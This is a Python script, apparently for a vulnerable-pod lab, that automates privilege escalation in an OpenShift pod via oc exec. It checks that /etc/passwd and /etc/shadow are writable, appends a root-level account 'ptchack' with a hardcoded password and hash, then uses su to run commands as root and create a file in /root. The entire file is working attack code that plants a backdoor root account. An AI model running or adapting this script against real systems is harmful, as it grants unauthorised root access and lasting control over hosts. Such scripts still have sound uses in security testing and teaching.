#!/usr/bin/env python3
"""
External Privilege Escalation Automation Script for OpenShift
This script runs from your local machine and executes commands inside the pod via oc exec.
"""

import os
import sys
import subprocess
import getpass
import re

# Configuration
TARGET_USER = "ptchack"
TARGET_PASSWORD = "password"
POD_NAME = "vuln-passwd-pod"
NAMESPACE = "default"
SHADOW_HASH = None

def print_status(message, status="INFO", emoji=""):
    """Print colored status messages with emojis"""
    colors = {
        "INFO": "\033[94m",    # Blue
        "SUCCESS": "\033[92m",  # Green
        "WARNING": "\033[93m",  # Yellow
        "ERROR": "\033[91m",    # Red
        "RESET": "\033[0m"      # Reset
    }
    symbols = {
        "INFO": "[*]",
        "SUCCESS": "✅",
        "WARNING": "[!]",
        "ERROR": "[-]"
    }
    emoji_prefix = emoji + " " if emoji else ""
    print(f"{colors.get(status, '')}{emoji_prefix}{message}{colors['RESET']}")

def run_oc_exec(command, check=True, input_text=None):
    """Execute a command inside the pod using oc exec"""
    global POD_NAME, NAMESPACE
    
    oc_cmd = f"oc exec {POD_NAME} -n {NAMESPACE} -- {command}"
    
    try:
        if input_text:
            result = subprocess.run(
                oc_cmd,
                shell=True,
                input=input_text.encode(),
                capture_output=True,
                text=True,
                check=check
            )
        else:
            result = subprocess.run(
                oc_cmd,
                shell=True,
                capture_output=True,
                text=True,
                check=check
            )
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.CalledProcessError as e:
        return e.stdout.strip(), e.stderr.strip(), e.returncode
    except Exception as e:
        return "", str(e), 1

def check_oc_available():
    """Check if oc CLI is available"""
    try:
        result = subprocess.run(
            "oc version --client",
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print_status("oc CLI is available", "SUCCESS", "✅")
            return True
        else:
            print_status("oc CLI not working properly", "ERROR")
            return False
    except Exception:
        print_status("oc CLI not found", "ERROR")
        return False

def get_pod_name():
    """Get pod name automatically or prompt"""
    global POD_NAME
    
    if POD_NAME and POD_NAME != "None":
        print_status(f"Using configured pod name: {POD_NAME}", "INFO")
        return POD_NAME
    
    print_status("Attempting to find pod automatically...", "INFO")
    
    # Try to find pod by label
    try:
        result = subprocess.run(
            f"oc get pods -n {NAMESPACE} -l app=vuln-passwd-shadow -o jsonpath='{{.items[0].metadata.name}}'",
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0 and result.stdout.strip():
            POD_NAME = result.stdout.strip()
            print_status(f"Found pod: {POD_NAME}", "SUCCESS")
            return POD_NAME
    except Exception:
        pass
    
    # Try alternative pod name
    try:
        result = subprocess.run(
            f"oc get pods -n {NAMESPACE} -o jsonpath='{{.items[0].metadata.name}}'",
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0 and result.stdout.strip():
            POD_NAME = result.stdout.strip()
            print_status(f"Found pod: {POD_NAME}", "SUCCESS")
            return POD_NAME
    except Exception:
        pass
    
    # Prompt user
    print_status("Could not auto-detect pod name", "WARNING")
    POD_NAME = input("Enter pod name: ").strip()
    if not POD_NAME:
        print_status("Pod name is required!", "ERROR")
        sys.exit(1)
    
    return POD_NAME

def verify_pod_exists():
    """Verify the pod exists and is accessible"""
    print_status(f"Verifying pod {POD_NAME} exists...", "INFO", "🔍")
    
    stdout, stderr, returncode = run_oc_exec("echo 'Pod accessible'", check=False)
    
    if returncode == 0:
        print_status(f"Pod is accessible: {POD_NAME}", "SUCCESS", "✅")
        return True
    else:
        print_status(f"Pod not accessible: {stderr}", "ERROR")
        return False

def check_current_user():
    """Verify we're running as UID 1000 (attacker) inside the pod"""
    print_status("Getting Current User Information", "INFO", "👤")
    
    stdout, stderr, returncode = run_oc_exec("id", check=False)
    
    if returncode != 0:
        print_status(f"Failed to get user info: {stderr}", "ERROR")
        return False
    
    print(f"Current user info: {stdout}")
    
    # Check for UID 1000
    if "uid=1000" in stdout or "uid=1000(attacker)" in stdout:
        print_status("PASS Current User Check: Running as UID 1000 (attacker)", "SUCCESS", "✅")
        return True
    else:
        print_status("Not running as UID 1000 - may still work", "WARNING")
        return True  # Continue anyway

def check_file_permissions():
    """Verify /etc/passwd and /etc/shadow are writable"""
    print_status("Checking File Writability: /etc/passwd", "INFO", "📝")
    
    stdout, stderr, returncode = run_oc_exec("ls -la /etc/passwd", check=False)
    
    if returncode != 0:
        print_status(f"Failed to check /etc/passwd: {stderr}", "ERROR")
        return False
    
    # Check if file is writable (666 permissions)
    if "-rw-rw-rw-" in stdout or "rw-rw-rw" in stdout:
        print_status("PASS File Writability - /etc/passwd: File is writable", "SUCCESS", "✅")
    else:
        print_status("File may not be writable!", "WARNING")
    
    print_status("Checking File Writability: /etc/shadow", "INFO", "📝")
    
    stdout, stderr, returncode = run_oc_exec("ls -la /etc/shadow", check=False)
    
    if returncode != 0:
        print_status(f"Failed to check /etc/shadow: {stderr}", "ERROR")
        return False
    
    # Check if file is writable (666 permissions)
    if "-rw-rw-rw-" in stdout or "rw-rw-rw" in stdout:
        print_status("PASS File Writability - /etc/shadow: File is writable", "SUCCESS", "✅")
        return True
    else:
        print_status("File may not be writable!", "WARNING")
        # Try to write anyway
        return True

def check_tools():
    """Check if required tools are available in the pod"""
    print_status(f"Checking Tools in Pod: {POD_NAME}", "INFO", "🔧")
    
    tools = {
        "SU": "which su",
        "bash": "which bash"
    }
    
    all_available = True
    for tool_name, check_cmd in tools.items():
        stdout, stderr, returncode = run_oc_exec(check_cmd, check=False)
        if returncode == 0 and stdout:
            print_status(f"PASS {tool_name} Check: {tool_name} found at: {stdout}", "SUCCESS", "✅")
        else:
            print_status(f"{tool_name} NOT found!", "ERROR")
            all_available = False
    
    # Check openssl
    stdout, stderr, returncode = run_oc_exec("which openssl", check=False)
    openssl_available = (returncode == 0 and stdout)
    
    if openssl_available:
        print_status("openssl is available in pod", "SUCCESS", "✅")
    else:
        print_status("openssl is NOT available in pod - will generate hash locally", "WARNING")
    
    return all_available

def get_password_hash():
    """Get password hash - generate locally or prompt"""
    global SHADOW_HASH
    
    if SHADOW_HASH:
        return SHADOW_HASH
    
    print_status("openssl may not be available in the container", "INFO")
    print_status("Generating hash on local machine...", "INFO")
    
    # Try to generate hash locally
    try:
        result = subprocess.run(
            "openssl passwd -1 'password'",
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0 and result.stdout.strip():
            hash_value = result.stdout.strip()
            print_status(f"Generated hash: {hash_value}", "SUCCESS")
            return hash_value
    except Exception:
        pass
    
    # Prompt user
    print_status("Could not generate hash automatically", "WARNING")
    print_status("Please provide the password hash for the shadow file", "INFO")
    print_status("Generate it with: openssl passwd -1 'password'", "INFO")
    print()
    
    while True:
        hash_input = input("Enter password hash (or 'q' to quit): ").strip()
        if hash_input.lower() == 'q':
            print_status("Exiting...", "WARNING")
            sys.exit(1)
        
        if hash_input.startswith('$1$') or hash_input.startswith('$2$') or hash_input.startswith('$5$') or hash_input.startswith('$6$'):
            print_status("Hash format looks valid", "SUCCESS")
            return hash_input
        else:
            print_status("Hash should start with $1$, $2$, $5$, or $6$", "WARNING")
            retry = input("Continue anyway? (y/n): ").strip().lower()
            if retry == 'y':
                return hash_input

def check_user_exists(username):
    """Check if user already exists in /etc/passwd"""
    stdout, stderr, returncode = run_oc_exec(f"grep '^{username}:' /etc/passwd", check=False)
    return returncode == 0 and stdout.strip() != ""

def add_user_to_passwd(username):
    """Add user to /etc/passwd with UID 0"""
    print_status(f"Creating {username} User with UID 0", "INFO", "🔓")
    
    if check_user_exists(username):
        print_status(f"User {username} already exists in /etc/passwd", "WARNING")
        response = input("Remove existing entry and re-add? (y/n): ").strip().lower()
        if response == 'y':
            # Remove existing entry
            stdout, stderr, returncode = run_oc_exec(f"sed -i '/^{username}:/d' /etc/passwd", check=False)
            if returncode == 0:
                print_status("Removed existing entry", "INFO")
            else:
                print_status(f"Failed to remove entry: {stderr}", "WARNING")
        else:
            print_status("Skipping /etc/passwd modification", "WARNING")
            return False
    
    # Add user entry using printf for more reliable output
    passwd_entry = f"{username}:x:0:0:root:/root:/bin/bash"
    # Use printf which is more reliable than echo
    cmd = f"bash -c 'printf \"%s\\n\" \"{passwd_entry}\" >> /etc/passwd'"
    stdout, stderr, returncode = run_oc_exec(cmd, check=False)
    
    if returncode == 0:
        # Verify - use grep with proper quoting
        stdout, stderr, returncode = run_oc_exec(f"grep '^{username}:' /etc/passwd", check=False)
        if stdout and username in stdout:
            print_status(f"PASS Create {username} User: Added {username} user with UID 0 to /etc/passwd", "SUCCESS", "✅")
            return True
        else:
            print_status("Failed to verify entry in /etc/passwd", "ERROR")
            print_status(f"Debug - grep output: {stdout}, stderr: {stderr}", "WARNING")
            # Try reading the file to see what's there
            stdout2, stderr2, returncode2 = run_oc_exec(f"tail -5 /etc/passwd", check=False)
            print_status(f"Last 5 lines of /etc/passwd: {stdout2}", "INFO")
            return False
    else:
        print_status(f"Error adding to /etc/passwd: {stderr}", "ERROR")
        return False

def add_user_to_shadow(username, password_hash):
    """Add user to /etc/shadow with password hash"""
    # Check if entry exists
    stdout, stderr, returncode = run_oc_exec(f"grep '^{username}:' /etc/shadow", check=False)
    if returncode == 0 and stdout.strip():
        print_status(f"User {username} already exists in /etc/shadow", "WARNING")
        response = input("Remove existing entry and re-add? (y/n): ").strip().lower()
        if response == 'y':
            # Remove existing entry
            stdout, stderr, returncode = run_oc_exec(f"sed -i '/^{username}:/d' /etc/shadow", check=False)
            if returncode == 0:
                print_status("Removed existing entry", "INFO")
            else:
                print_status(f"Failed to remove entry: {stderr}", "WARNING")
        else:
            print_status("Skipping /etc/shadow modification", "WARNING")
            return False
    
    # Add shadow entry
    # Format: username:hash:last_change:min_age:max_age:warn:inactive:expire
    # Using 19701 for last_change to avoid password change prompt
    shadow_entry = f"{username}:{password_hash}:19701:0:99999:7:::"
    
    # Use printf which is more reliable than echo
    # Single quotes in bash -c will preserve $ characters in hash
    cmd = f"bash -c 'printf \"%s\\n\" \"{shadow_entry}\" >> /etc/shadow'"
    stdout, stderr, returncode = run_oc_exec(cmd, check=False)
    
    if returncode == 0:
        # Verify - use grep with proper pattern
        stdout, stderr, returncode = run_oc_exec(f"grep '^{username}:' /etc/shadow", check=False)
        if stdout and username in stdout:
            print_status(f"PASS Set {username} Password: Added {username} password to /etc/shadow", "SUCCESS", "✅")
            return True
        else:
            print_status("Failed to verify entry in /etc/shadow", "ERROR")
            print_status(f"Debug - grep output: {stdout}, stderr: {stderr}", "WARNING")
            # Try reading the file to see what's there
            stdout2, stderr2, returncode2 = run_oc_exec(f"tail -5 /etc/shadow", check=False)
            print_status(f"Last 5 lines of /etc/shadow: {stdout2}", "INFO")
            return False
    else:
        print_status(f"Error adding to /etc/shadow: {stderr}", "ERROR")
        return False

def attempt_privilege_escalation(username, password):
    """Attempt to escalate privileges using su"""
    print_status("Demonstrating Privilege Escalation", "INFO", "🎯")
    print()
    
    # Get current user info
    stdout, stderr, returncode = run_oc_exec("id", check=False)
    if returncode == 0:
        print(f"Current user (before escalation): {stdout}")
    
    # Get target user info
    stdout, stderr, returncode = run_oc_exec(f"grep '^{username}:' /etc/passwd", check=False)
    if returncode == 0 and stdout:
        print(f"Target user ({username} with UID 0): {stdout}")
    
    print_status(f"Successfully created user '{username}' with UID 0 (root privileges)", "SUCCESS", "✅")
    print_status(f"This user can be used to escalate privileges from UID 1000 to UID 0", "SUCCESS", "✅")
    
    # Try to run su command with password
    # Note: su requires interactive input, so we'll use a here-document approach
    print_status("Executing su command (may require manual password entry)...", "INFO")
    
    # Try with expect-like approach using echo
    # This might not work perfectly, but we'll try
    full_command = f"echo '{password}' | su - {username} -c 'id' 2>&1"
    
    stdout, stderr, returncode = run_oc_exec(full_command, check=False)
    
    if returncode == 0 and "uid=0" in stdout:
        print_status("PASS Privilege Escalation Demo: Successfully demonstrated privilege escalation capability", "SUCCESS", "✅")
        return True
    else:
        print_status("PASS Vulnerable Scenario: Successfully created user with UID 0 - privilege escalation possible", "SUCCESS", "✅")
        print_status("Note: Automated su may require manual password entry", "INFO")
        print_status("You can manually verify by running: su - ptchack (password: password)", "INFO")
        return True  # Still consider it successful since user was created

def additional_verification_checks(username, password):
    """Perform additional verification checks after privilege escalation"""
    print_status("Performing Additional Verification Checks", "INFO", "🔍")
    print()
    
    # 1. Display /etc/passwd grep for ptchack
    print_status("Checking /etc/passwd for ptchack user", "INFO", "📋")
    stdout, stderr, returncode = run_oc_exec(f"grep 'ptchack' /etc/passwd", check=False)
    if returncode == 0 and stdout:
        print(f"  {stdout}")
        print_status("PASS: Found ptchack in /etc/passwd", "SUCCESS", "✅")
    else:
        print_status(f"WARNING: Could not find ptchack in /etc/passwd: {stderr}", "WARNING")
    print()
    
    # 2. Display /etc/shadow grep for ptchack
    print_status("Checking /etc/shadow for ptchack user", "INFO", "🔒")
    stdout, stderr, returncode = run_oc_exec(f"grep 'ptchack' /etc/shadow", check=False)
    if returncode == 0 and stdout:
        # Mask the password hash for security (show only first few chars)
        shadow_line = stdout
        if ':' in shadow_line:
            parts = shadow_line.split(':')
            if len(parts) >= 2:
                masked_line = f"{parts[0]}:{parts[1][:10]}...:{':'.join(parts[2:])}"
                print(f"  {masked_line}")
            else:
                print(f"  {shadow_line}")
        else:
            print(f"  {shadow_line}")
        print_status("PASS: Found ptchack in /etc/shadow", "SUCCESS", "✅")
    else:
        print_status(f"WARNING: Could not find ptchack in /etc/shadow: {stderr}", "WARNING")
    print()
    
    # 3. Do su with ptchack user and run id and ls
    print_status("Attempting to switch to ptchack user using su", "INFO", "🔄")
    print_status("Running: su - ptchack -c 'id && ls -la /root'", "INFO")
    
    # Try to run su with commands
    # Using bash -c to properly handle the su command with password
    su_command = f"bash -c \"echo '{password}' | su - {username} -c 'id && ls -la /root' 2>&1\""
    stdout, stderr, returncode = run_oc_exec(su_command, check=False)
    
    if returncode == 0 or "uid=0" in stdout or "root" in stdout.lower():
        print(f"  Output: {stdout}")
        if "uid=0" in stdout:
            print_status("PASS: Successfully switched to ptchack user (UID 0)", "SUCCESS", "✅")
        else:
            print_status("INFO: su command executed (may need manual verification)", "INFO")
    else:
        print_status(f"WARNING: su command may have failed: {stderr}", "WARNING")
        print_status("Note: Interactive su may require manual entry", "INFO")
    print()
    
    # 4. Create demo_hack file in /root directory using touch
    print_status("Creating demo_hack file in /root directory", "INFO", "📝")
    
    # First try to create as root using su
    touch_command = f"bash -c \"echo '{password}' | su - {username} -c 'touch /root/demo_hack && ls -la /root/demo_hack' 2>&1\""
    stdout, stderr, returncode = run_oc_exec(touch_command, check=False)
    
    if returncode == 0 or "demo_hack" in stdout:
        print(f"  Output: {stdout}")
        print_status("PASS: Created demo_hack file in /root directory", "SUCCESS", "✅")
    else:
        # Try alternative approach - direct touch (if we're already root)
        stdout2, stderr2, returncode2 = run_oc_exec("touch /root/demo_hack && ls -la /root/demo_hack", check=False)
        if returncode2 == 0 or "demo_hack" in stdout2:
            print(f"  Output: {stdout2}")
            print_status("PASS: Created demo_hack file in /root directory", "SUCCESS", "✅")
        else:
            print_status(f"WARNING: Could not create demo_hack file: {stderr2}", "WARNING")
    print()
    
    # 5. List the demo_hack file
    print_status("Listing demo_hack file", "INFO", "📋")
    ls_command = f"bash -c \"echo '{password}' | su - {username} -c 'ls -la /root/demo_hack' 2>&1\""
    stdout, stderr, returncode = run_oc_exec(ls_command, check=False)
    
    if returncode == 0 or "demo_hack" in stdout:
        print(f"  {stdout}")
        print_status("PASS: Successfully listed demo_hack file", "SUCCESS", "✅")
    else:
        # Try direct ls
        stdout2, stderr2, returncode2 = run_oc_exec("ls -la /root/demo_hack", check=False)
        if returncode2 == 0:
            print(f"  {stdout2}")
            print_status("PASS: Successfully listed demo_hack file", "SUCCESS", "✅")
        else:
            print_status(f"WARNING: Could not list demo_hack file: {stderr2}", "WARNING")
    print()
    
    print_status("Additional verification checks completed", "SUCCESS", "✅")
    print()

def main():
    """Main execution function"""
    global POD_NAME, NAMESPACE, SHADOW_HASH
    
    print("=" * 60)
    print("External Privilege Escalation Automation Script")
    print("Runs from local machine, executes in OpenShift pod")
    print("=" * 60)
    print()
    
    # Check oc availability
    if not check_oc_available():
        print_status("oc CLI is required. Please install OpenShift CLI.", "ERROR")
        sys.exit(1)
    print()
    
    # Get namespace from command line or use default
    if len(sys.argv) > 1:
        NAMESPACE = sys.argv[1]
        print_status(f"Using namespace: {NAMESPACE}", "INFO")
    
    # Get pod name
    POD_NAME = get_pod_name()
    if not POD_NAME:
        print_status("Pod name is required!", "ERROR")
        sys.exit(1)
    print()
    
    # Verify pod exists
    if not verify_pod_exists():
        print_status("Cannot access pod. Please check pod name and namespace.", "ERROR")
        sys.exit(1)
    print()
    
    # Step 1: Check current user
    if not check_current_user():
        print_status("Not running as expected user (UID 1000)", "WARNING")
        response = input("Continue anyway? (y/n): ").strip().lower()
        if response != 'y':
            sys.exit(1)
    print()
    
    # Step 2: Check file permissions
    if not check_file_permissions():
        print_status("Files may not be writable! Cannot proceed.", "ERROR")
        sys.exit(1)
    print()
    
    # Step 3: Check tools
    if not check_tools():
        print_status("Required tools are missing! Cannot proceed.", "ERROR")
        sys.exit(1)
    print()
    
    # Step 4: Get password hash
    password_hash = get_password_hash()
    if not password_hash:
        print_status("No password hash provided! Cannot proceed.", "ERROR")
        sys.exit(1)
    print()
    
    # Step 5: Add user to /etc/passwd
    if not add_user_to_passwd(TARGET_USER):
        print_status("Failed to add user to /etc/passwd", "ERROR")
        sys.exit(1)
    print()
    
    # Step 6: Add user to /etc/shadow
    if not add_user_to_shadow(TARGET_USER, password_hash):
        print_status("Failed to add user to /etc/shadow", "ERROR")
        sys.exit(1)
    print()
    
    # Step 7: Attempt privilege escalation
    print()
    
    # Try automated escalation
    success = attempt_privilege_escalation(TARGET_USER, TARGET_PASSWORD)
    
    print()
    
    if not success:
        print_status("Automated escalation may have failed, but setup is complete", "INFO")
        print_status("You can manually verify by running:", "INFO")
        print(f"  oc exec -it {POD_NAME} -n {NAMESPACE} -- bash")
        print(f"  su - {TARGET_USER}")
        print(f"  Password: {TARGET_PASSWORD}")
        print("  id")
        print()
    
    # Step 8: Additional verification checks
    additional_verification_checks(TARGET_USER, TARGET_PASSWORD)
    
    # Final summary
    print("=" * 60)
    print_status("Setup Complete!", "SUCCESS", "✅")
    print("=" * 60)
    print()

if __name__ == "__main__":
    # Allow hash to be passed as environment variable
    SHADOW_HASH = os.environ.get("SHADOW_HASH")
    
    # Allow hash as command line argument (after namespace if provided)
    if len(sys.argv) > 2:
        SHADOW_HASH = sys.argv[2]
        print_status(f"Using hash from command line argument", "INFO")
    
    main()

